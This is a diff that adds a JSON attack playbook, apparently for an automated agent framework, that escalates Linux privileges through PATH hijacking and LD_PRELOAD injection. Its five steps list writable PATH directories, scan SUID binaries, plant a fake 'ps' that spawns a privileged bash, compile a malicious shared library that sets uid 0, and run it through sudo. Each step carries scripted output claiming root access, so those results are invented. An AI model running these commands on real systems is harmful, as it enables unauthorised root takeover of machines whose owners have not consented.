@@ -1,0 +1,30 @@
+{
+  "name": "writable_path_exploitation",
+  "description": "Exploit writable directories in PATH and LD_PRELOAD for privilege escalation",
+  "pattern": "path.*hijack|ld_preload.*exploit|library.*injection|path.*exploit",
+  "parameters": [],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo $PATH && for dir in $(echo $PATH | tr ':' ' '); do ls -ld $dir 2>/dev/null; done"]},
+      "expected_output": {"type": "string", "example": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/scripts\n\ndrwxr-xr-x 2 root root 4096 /usr/local/sbin\ndrwxr-xr-x 2 root root 4096 /usr/local/bin\ndrwxr-xr-x 2 root root 4096 /usr/sbin\ndrwxr-xr-x 2 root root 4096 /usr/bin\ndrwxr-xr-x 2 root root 4096 /sbin\ndrwxr-xr-x 2 root root 4096 /bin\ndrwxrwxrwx 2 root root 4096 /opt/scripts\n\nWritable PATH directory found: /opt/scripts (world-writable!)"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "find / -perm -4000 -type f 2>/dev/null -exec strings {} \\; | grep -E '^[a-z]+$' | head -20"]},
+      "expected_output": {"type": "string", "example": "Searching for relative paths in SUID binaries...\n\nFound in /usr/local/bin/backup:\ntar\ngzip\necho\ndate\n\nFound in /usr/local/bin/monitor:\nps\nnetstat\nifconfig\n\nSUID binaries using relative paths detected - exploitable via PATH"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '#!/bin/bash' > /opt/scripts/ps && echo '/bin/bash -p' >> /opt/scripts/ps && chmod +x /opt/scripts/ps && /usr/local/bin/monitor"]},
+      "expected_output": {"type": "string", "example": "Creating malicious 'ps' in writable PATH directory\n\nCreated /opt/scripts/ps:\n#!/bin/bash\n/bin/bash -p\n\nExecuting SUID binary /usr/local/bin/monitor (uses 'ps' command)\n\nbash-4.4# id\nuid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)\n\nbash-4.4# whoami\nroot\n\nPrivilege escalation via PATH hijacking successful"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > /tmp/shell.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\nEOF\ngcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles"]},
+      "expected_output": {"type": "string", "example": "Creating malicious shared library for LD_PRELOAD injection\n\nCompiled /tmp/shell.so:\n  Function _init() will execute before main()\n  Drops privileges to root (setuid/setgid 0)\n  Spawns /bin/bash\n\nShared library ready for LD_PRELOAD exploitation"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "sudo", "args": ["LD_PRELOAD=/tmp/shell.so", "/usr/bin/find"]},
+      "expected_output": {"type": "string", "example": "Testing LD_PRELOAD with sudo...\n\nChecking sudo -l for LD_PRELOAD preservation:\nMatching Defaults entries:\n    env_keep+=LD_PRELOAD\n\nLD_PRELOAD is preserved in sudo environment!\n\nExecuting: sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find\n\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@victim:~# echo \"Root shell via LD_PRELOAD injection\"\nRoot shell via LD_PRELOAD injection\n\nPrivilege escalation successful via LD_PRELOAD"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
